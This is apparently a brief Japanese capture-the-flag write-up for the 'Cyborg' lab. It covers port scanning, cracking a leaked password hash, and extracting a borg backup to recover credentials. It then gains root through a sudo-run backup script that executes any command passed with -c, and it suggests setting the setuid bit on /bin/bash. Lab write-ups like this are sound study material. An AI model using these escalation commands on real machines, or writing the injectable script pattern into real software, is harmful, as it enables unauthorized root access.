---
title: "Cyborg"
date: 2024-02-21T07:18:48+09:00
draft: false
---

ウェルベルムコトハちゃんの事実を曲げる能力強すぎない？

### enum

- nmap
  - 22/ssh
  - 80/http
- gobuster
  - /admin
  - /etc

### ssh

- /etc にアクセスすると squid プロキシの情報が見れる
- ユーザ名とパスワードハッシュの組み合わせが見えるのでこれを使う
- とりあえず john でパスワードを手に入れる
- ssh にこれを使ったけど通らなかった
- hydra も通らない
- http に戻るとバックアップファイルをダウンロードするところがあったのでダウンロードする
  - ```tar -xvf archive.tar```
- borg というバックアップアプリを使っているらしい
  - ```borg list /home/kali/THM/home/field/dev/final_archive```
  - ```borg extract /home/kali/THM/home/field/dev/final_archive::music_archive```
- borg の使い方に少し苦労した
- ユーザ名は alex, パスワードも note.txt に書いてある

### root.txt

- ssh する
- sudo -l で ```/etc/mp3backups/backup.sh``` が見つかる

```bash
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done

--- (snip) ---

cmd=$($command)
echo $cmd

```

- -c オプションでコマンドを実行できる(なんのため？)
  - ```sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt "```
- ほんとうは ```chmod +s /bin/bash``` ってやるといいらしい
